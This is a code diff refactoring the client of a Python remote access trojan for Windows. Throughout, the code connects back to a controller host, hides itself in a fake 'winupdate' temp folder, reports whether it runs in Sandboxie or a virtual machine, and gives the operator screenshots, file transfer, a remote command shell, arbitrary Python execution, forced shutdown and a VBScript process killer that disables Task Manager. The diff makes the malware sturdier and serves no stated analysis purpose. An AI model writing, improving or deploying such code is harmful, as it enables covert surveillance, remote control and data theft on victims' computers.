@@ -2,7 +2,7 @@ import socket, os, sys, platform, time, ctypes, subprocess, sqlite3, pyscreeze, 
 import win32api, winerror, win32event, win32crypt
 from shutil import copyfile
 from winreg import *
-from io import StringIO
+from io import StringIO, BytesIO
 
 strHost = "127.0.0.1"
 # strHost = socket.gethostbyname("")
@@ -25,35 +25,35 @@ if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
 
 # function to move file to tmp dir and relaunch
 def meltFile():
+    winupdate = TMP + "\\winupdate"
     # ignore if the path is in appdata as well
-    if not (os.getcwd() == TMP + "\\winupdate") and not (os.getcwd() == APPDATA):
+    if not (os.getcwd() == winupdate) and not (os.getcwd() == APPDATA):
         # if folder already exists
         try:
-            os.mkdir(TMP + "\\winupdate")
+            os.mkdir(winupdate)
         except:
             pass
-        strNewFile = TMP + "\\winupdate\\" + os.path.basename(sys.argv[0])
+        strNewFile = os.path.join(winupdate, os.path.basename(sys.argv[0]))
 
-        subprocess.Popen(
-            "timeout 2 & move /y " + os.path.realpath(sys.argv[0]) + " " +  # move file to TMP and then relaunch
-            strNewFile + " & cd  /d " + TMP + "\\winupdate\\" + " & " + strNewFile, shell=True)
+        strCommand = f"timeout 2 & move /y {os.path.realpath(sys.argv[0])} {strNewFile} & cd /d {winupdate}\\ & {strNewFile}"
+        subprocess.Popen(strCommand, shell=True)
         sys.exit(0)
 
 
 def detectSandboxie():
     try:
         ctypes.windll.LoadLibrary("SbieDll.dll")
-
-        return " (Sandboxie) "
-    except: return ""
+    except Exception:
+        return False
+    return True
 
 
 def detectVM():
     objWMI = wmi.WMI()
     for objDiskDrive in objWMI.query("Select * from Win32_DiskDrive"):
         if "vbox" in objDiskDrive.Caption.lower() or "virtual" in objDiskDrive.Caption.lower():
-            return " (Virtual Machine) "
-    return ""
+            return True
+    return False
 
 
 def startup(onstartup):
@@ -96,8 +96,13 @@ def server_connect():
             time.sleep(5)  # wait 5 seconds to try again
         else: break
 
-    strUserInfo = socket.gethostname() + "`," + platform.system() + " " + platform.release() + detectSandboxie() + detectVM() + \
-                  "`," + os.environ["USERNAME"]
+    strUserInfo = f"{socket.gethostname()}`,{platform.system()} {platform.release()}"
+    if detectSandboxie():
+        strUserInfo += " (Sandboxie) "
+    if detectVM():
+        strUserInfo += " (Virtual Machine) "
+    strUserInfo += f"`,{os.environ['USERNAME']}"
+
     send(str.encode(strUserInfo))
 
 # function to return decoded utf-8
@@ -153,22 +158,27 @@ def recvall(buffer):  # function to receive large amounts of data
 
 # vbs message box
 def MessageBox(message):
-    objVBS = open(TMP + "/m.vbs", "w")
-    objVBS.write("Msgbox \"" + message + "\", vbOKOnly+vbInformation+vbSystemModal, \"Message\"")
-    objVBS.close()
-    subprocess.Popen(["cscript", TMP + "/m.vbs"], shell=True)
+    strScript = os.path.join(TMP + "m.vbs")
+    with open(strScript, "w") as objVBS:
+        objVBS.write(f'Msgbox "{message}", vbOKOnly+vbInformation+vbSystemModal, "Message"')
+    subprocess.Popen(["cscript", strScript], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
 
 
 def screenshot():
-    pyscreeze.screenshot(TMP + "/s.png")
+    # Take Screenshot
+    objImage = pyscreeze.screenshot()
+    # Create BytesIO Object as objBytes
+    with BytesIO() as objBytes:
+        # Save Screenshot into BytesIO Object
+        objImage.save(objBytes, format='PNG')
+        # Get BytesIO Object Data as bytes
+        objPic = objBytes.getvalue()
 
     # send screenshot information to server
-    send(str.encode("Receiving Screenshot" + "\n" + "File size: " + str(os.path.getsize(TMP + "/s.png"))
-                              + " bytes" + "\n" + "Please wait..."))
-    objPic = open(TMP + "/s.png", "rb")  # send file contents and close the file
+    send(str(len(objPic)).encode())
     time.sleep(1)
-    send(objPic.read())
-    objPic.close()
+    # Send Image Data to Server
+    send(objPic)
 
 
 def file_browser():
@@ -206,9 +216,8 @@ def upload(data):
     strOutputFile = decode_utf8(recv(intBuff))
 
     try:
-        objFile = open(strOutputFile, "wb")
-        objFile.write(file_data)
-        objFile.close()
+        with open(strOutputFile, "wb") as objFile:
+            objFile.write(file_data)
         send(str.encode("Done!!!"))
     except:
         send(str.encode("Path is protected/invalid!"))
@@ -219,12 +228,10 @@ def receive(data):
         send(str.encode("Target file not found!"))
         return
 
-    send(str.encode("File size: " + str(os.path.getsize(data))
-                              + " bytes" + "\n" + "Please wait..."))
-    objFile = open(data, "rb")  # send file contents and close the file
+    send(str(os.path.getsize(data)).encode())
     time.sleep(1)
-    send(objFile.read())
-    objFile.close()
+    with open(data, 'rb') as objFile:
+        send(objFile.read()) # Send Contents of File
 
 
 def lock():
@@ -232,16 +239,15 @@ def lock():
 
 
 def shutdown(shutdowntype):
-    command = "shutdown {0} -f -t 30".format(shutdowntype)
-    subprocess.Popen(command.split(), shell=True)
+    command = f"shutdown {shutdowntype} -f -t 30"
+    subprocess.Popen(command.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
     objSocket.close()  # close connection and exit
     sys.exit(0)
 
 
 def command_shell():
-    strCurrentDir = str(os.getcwd())
-
-    send(str.encode(strCurrentDir))
+    strCurrentDir = os.getcwd()
+    send(os.getcwdb())
 
     while True:
         strData = decode_utf8(recv(intBuff))
@@ -256,13 +262,13 @@ def command_shell():
                 strOutput = (objCommand.stdout.read()).decode("utf-8").splitlines()[0]  # decode and remove new line
                 os.chdir(strOutput)  # change directory
 
-                bytData = str.encode("\n" + str(os.getcwd()) + ">")  # output to send the server
+                bytData = str.encode(f"\n{str(os.getcwd())}>")  # output to send the server
 
         elif len(strData) > 0:
             objCommand = subprocess.Popen(strData, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
             strOutput = (objCommand.stdout.read() + objCommand.stderr.read()).decode("utf-8", errors="replace")  # since cmd uses bytes, decode it
 
-            bytData = str.encode(strOutput + "\n" + str(os.getcwd()) + ">")
+            bytData = str.encode(f"{strOutput}\n{os.getcwd()}>")
         else:
             bytData = str.encode("Error!!!")
 
@@ -282,7 +288,7 @@ def python_interpreter():
         redirected_output = sys.stdout = StringIO()
         try:
             exec(strCommand)
-            print("")
+            print()
             strError = None
         except Exception as e:
             strError = f"{e.__class__.__name__}: "
@@ -300,23 +306,23 @@ def python_interpreter():
 def vbs_block_process(process, popup, message, title, timeout, type):
     # VBScript to block process, this allows the script to disconnect from the original python process, check github rep for source
 
-    strVBSCode = "On Error Resume Next" + "\n" + \
-                 "Set objWshShl = WScript.CreateObject(\"WScript.Shell\")" + "\n" + \
-                 "Set objWMIService = GetObject(\"winmgmts:\" & \"{impersonationLevel=impersonate}!//./root/cimv2\")" + "\n" + \
+    strVBSCode = "On Error Resume Next\n" + \
+                 "Set objWshShl = WScript.CreateObject(\"WScript.Shell\")\n" + \
+                 "Set objWMIService = GetObject(\"winmgmts:\" & \"{impersonationLevel=impersonate}!//./root/cimv2\")\n" + \
                  "Set colMonitoredProcesses = objWMIService.ExecNotificationQuery(\"select * " \
-                 "from __instancecreationevent \" & \" within 1 where TargetInstance isa 'Win32_Process'\")" + "\n" + \
-                 "Do" + "\n" + "Set objLatestProcess = colMonitoredProcesses.NextEvent" + "\n" + \
-                 "If LCase(objLatestProcess.TargetInstance.Name) = \"" + process + "\" Then" + "\n" + \
-                 "objLatestProcess.TargetInstance.Terminate" + "\n"
+                 "from __instancecreationevent \" & \" within 1 where TargetInstance isa 'Win32_Process'\")\n" + \
+                 "Do" + "\n" + "Set objLatestProcess = colMonitoredProcesses.NextEvent\n" + \
+                 f"If LCase(objLatestProcess.TargetInstance.Name) = \"{process}\" Then\n" + \
+                 "objLatestProcess.TargetInstance.Terminate\n"
     if popup == "True":  # if showing a message
-        strVBSCode += "objWshShl.Popup \"" + message + "\"," + timeout + ", \"" + title + "\"," + type + "\n"
+        strVBSCode += f'objWshShl.Popup "{message}",{timeout}, "{title}",{type}\n'
 
-    strVBSCode += "End If" + "\n" + "Loop"
+    strVBSCode += "End If\nLoop"
 
-    objVBSFile = open(TMP + "/d.vbs", "w")  # write the code and close the file
-    objVBSFile.write(strVBSCode); objVBSFile.close()
+    with open(TMP + "/d.vbs", "w") as objVBSFile:
+        objVBSFile.write(strVBSCode)
 
-    subprocess.Popen(["cscript", TMP + "/d.vbs"], shell=True)  # run the script
+    subprocess.Popen(["cscript", TMP + "/d.vbs"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)  # run the script
 
 
 def disable_taskmgr():
@@ -324,7 +330,7 @@ def disable_taskmgr():
     if blnDisabled == "False":  # if task manager is already disabled, enable it
         send(str.encode("Enabling ..."))
 
-        subprocess.Popen(["taskkill", "/f", "/im", "cscript.exe"], shell=True)
+        subprocess.Popen(["taskkill", "/f", "/im", "cscript.exe"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
 
         blnDisabled = "True"
     else:
